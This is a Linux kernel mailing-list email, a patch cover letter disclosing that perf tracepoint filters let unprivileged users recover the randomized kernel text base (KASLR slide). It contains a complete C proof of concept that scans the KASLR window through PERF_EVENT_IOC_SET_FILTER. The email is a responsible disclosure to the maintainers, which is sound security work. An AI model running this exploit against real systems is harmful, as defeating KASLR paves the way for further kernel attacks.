Received: from mail-dl2-f36.google.com (mail-dl2-f36.google.com [74.125.229.164])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D72CA35674A
	for <linux-kernel@vger.kernel.org>; Mon, 28 Sep 2026 00:00:50 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.229.164
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790553654; cv=none; b=DUg/NNbQlCKvpzCchOVbeSf1jFir73zSUAeF4u+jxVrczItGurep8tJQvEusTfnXy5+L3+zvxCLRR2Lmv5oEJbrvXc/VRBh82oSE873BcDednbfNpJn/NtXQvYZWugAPCDhBc/7I8iH2uTVRDWG5CqEUJRy1uOSAuQNqV0ElqMs=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790553654; c=relaxed/simple;
	bh=xAV81QeqR4ZtpFqOVKF9+IHtT4wTiC4bAZ5jEUD3yEo=;
	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version; b=pO3Zo+CVc2fyLBGiKegrFk1x/LC4YfYOW6XFL5W3jwANKpybjXcE37ljcXK0xbb7CeeoRCL9Un6qQ66gSJWntjHBlCU8jDpuqURdvhPDkrECNclV87zrRr4Cw2oXd3cIqF1tEJhAzFEJDbVjlqPmgMiySTXLnEEDTl8ifEMWhes=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=rBT9DDkT; arc=none smtp.client-ip=74.125.229.164
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="rBT9DDkT"
Received: by mail-dl2-f36.google.com with SMTP id a92af1059eb24-14373bcc010so2072664c88.1
        for <linux-kernel@vger.kernel.org>; Sun, 27 Sep 2026 17:00:50 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1790553649; x=1791158449; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=SgLgFlJ5lNb0xBi63DpiDCEsIJzMQgnYp0doLWd9kSc=;
        b=rBT9DDkTXPWbjkWwrBHqlqaEKQ/ZD8ADHrbJ7+ys2B1XLtdVYmXbuzK3XUVEqu7O0N
         F+5PBYuzHUqv7HHitPBC+xPjVhaSCv04lWbCn8RS4x3pf6EWjDVWIMu75O6C8BjBqPOE
         7TXOQvLLy238pw3S8sNuePOAzrONfGgy+OzTHg8QZ03VuWa4dDUk0/BOBhA63K+RzocM
         Yr/0woGNn8GBQzhk0z8zRXcpI05CCkbhQHAjToWg9cga1oN6JSO1OFS9umxVKg+iQ1Yr
         N1vjCxg5Xmk/6AU5Vx/sHMpaRfoOhbDXIvvlu17yDPSoAjBkvUGJW4GN9K0UsNrpFeZa
         b/JQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790553649; x=1791158449;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=SgLgFlJ5lNb0xBi63DpiDCEsIJzMQgnYp0doLWd9kSc=;
        b=TJJhDwp7b7OMV3RUnVWUtoVoMNKmprBWm7wmuD2n0f7OxI1X8cSMNI3k5sIx5euiIT
         RoPNlxidmTh+lnLXYwNkJHJdNnNbkrQK9tPBYzCFFWUH7FZ6JdUAwIrgZKSwmYAjY4nX
         J/ZReWVWSB82sk3YcSxiRs/3Y/65hbyTjvkzD+3r4l4sUZnI7hL0coGCAtj71VRbKgd4
         JlXwNxl3wCIeZAl9aA9FK8yopykN2S9SlfkYVVDTyTSOJh8DUkWQjSy+S8tzcE7QKilp
         N7Jc96T/Hrz1xfWcyDags9rp12D16b5w9XPYzdRP/7DV1/Qpiw4R6lVhOoX6zUqCDuzM
         TIGw==
X-Forwarded-Encrypted: i=1; AKwUvBzMy4bDxTjrvriz2MoyNeTVjRRwieADOkQfSosYxYKeeIqcbXymwpEyZtW6qVIL00+vq+6PZTTOrtIwNaQ=@vger.kernel.org
X-Gm-Message-State: AFuF++kd5ATU0rw/pVOSugE7OAk7/L7CHAlPDy70cr/LCarrQSMOyRKn
	4usXbjYZFBKWBoPBAFlg7QXWdo0pHRbY8PMHBPmvJ+bYbcCUpFQsv3Omk8eBiYuT
X-Gm-Gg: AYBFou0hQgyi0lVGHlojdKVUj9EVhsnwVV7gN9jQji/UbpuixbJO0q/kCrotKw2hhYz
	osNYf893thgh8t46tURyITiZG8M394pVIPj7UeLL/t5NZEz083sIUL3sikAfpvfDBYxKK9/kmBD
	CoVPBs4Fe0TixIqQK/qDihQPnCSIFcdHOqgsuWav4MtT1UZ415yfF8hGuLoqFxDdIa0HLiXF+vx
	TLf04uqkac747lBhO/sWX0afK5B/9Jj1pU4PU/b/phL0sp0c4fvnOk6loNj7+izPRMeUrf/cY8m
	J1WYyJFX5eVw9QWhtYfL7BPHULyGrhMlYhnWIf/cgcGWzYoYcbn2xwipM5hHHBOm8n2+9yXNw1M
	tiTFXRemynjgoZq8xopZmA05ulWN/M8w9gFU2o0GOuie3qPNHgSS5iakknb4/KlhMmsqaNoUAK5
	qHA41bXlOXehOWkM2rcpGF/12GiMNZA03Bn6ygcKgqLCIiAL8is3dIRL9vz+X8dNgR0NTXlcDHQ
	1uN3A3t
X-Received: by 2002:a05:7022:f84:b0:13f:ad08:4497 with SMTP id a92af1059eb24-146ce1a80ffmr12159470c88.4.1790553647655;
        Sun, 27 Sep 2026 17:00:47 -0700 (PDT)
Received: from kq.cs.ucr.edu (kq.cs.ucr.edu. [169.235.27.223])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-145acc47ab8sm23752109c88.6.2026.09.27.17.00.41
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 27 Sep 2026 17:00:42 -0700 (PDT)
From: Zhengchuan Liang <zcliangcn@gmail.com>
To: Steven Rostedt <rostedt@goodmis.org>
Cc: Masami Hiramatsu <mhiramat@kernel.org>,
	Mathieu Desnoyers <mathieu.desnoyers@efficios.com>,
	Ross Zwisler <zwisler@google.com>,
	linux-trace-kernel@vger.kernel.org,
	linux-kernel@vger.kernel.org,
	Peter Zijlstra <peterz@infradead.org>,
	linux-perf-users@vger.kernel.org,
	stable@vger.kernel.org,
	Zhengchuan Liang <zcliangcn@gmail.com>
Subject: [PATCH 0/1] perf tracepoint filter exposes the kernel text base
Date: Sun, 27 Sep 2026 17:00:30 -0700
Message-Id: <cover.1790553331.git.zcliangcn@gmail.com>
X-Mailer: git-send-email 2.25.1
Precedence: bulk
X-Mailing-List: linux-kernel@vger.kernel.org
List-Id: <linux-kernel.vger.kernel.org>
List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi,

I found and validated an information leak in
kernel/trace/trace_events_filter.c. An unprivileged user can recover the
randomized kernel text base, revealing the kernel's KASLR slide, by
observing PERF_EVENT_IOC_SET_FILTER return values for a disabled,
count-only perf tracepoint event.

Such an event can be opened with exclude_kernel=1 and sample_type=0. The
ioctl nevertheless accepts .function predicates. A numeric operand is
passed to kallsyms_lookup_size_offset(), so success distinguishes an
address in the kernel image from one outside it. A symbolic operand
likewise resolves a kernel symbol internally and can compare its address
with a task-controlled tracepoint field.

Here is a minimized numeric PoC for an x86_64 kernel built with
CONFIG_KALLSYMS_ALL=y. The scan uses 2 MiB steps, the minimum permitted
value of CONFIG_PHYSICAL_ALIGN on x86_64, and covers the 1 GiB virtual
KASLR window. Event ID 5 identifies the built-in TRACE_PRINT event.
The upstream default is perf_event_paranoid=2. Some distributions retain
that setting, while others use a stricter value. With the default
setting, run the PoC as an unprivileged user:

  #define _GNU_SOURCE
  #include <linux/perf_event.h>
  #include <stdio.h>
  #include <sys/ioctl.h>
  #include <sys/syscall.h>
  #include <unistd.h>

  int main(void)
  {
          struct perf_event_attr a = {
                  .type = PERF_TYPE_TRACEPOINT, .size = sizeof(a),
                  .config = 5, .disabled = 1, .exclude_kernel = 1,
          };
          int fd = syscall(SYS_perf_event_open, &a, 0, -1, -1, 0);
          char filter[64];

          if (fd < 0)
                  return 1;
          for (unsigned long long p = 0xffffffff80000000ULL;
               p < 0xffffffffc0000000ULL; p += 0x200000ULL) {
                  snprintf(filter, sizeof(filter),
                           "ip.function == 0x%llx", p);
                  if (!ioctl(fd, PERF_EVENT_IOC_SET_FILTER, filter)) {
                          printf("_stext=0x%llx\n", p);
                          return 0;
                  }
          }
          return 2;
  }

I reproduced the leak under these conditions as an unprivileged user on
a kernel built from the current upstream tree. The reported _stext
matched the value in /proc/kallsyms as read by root. The PoC needs no
tracefs access or perf sample data.
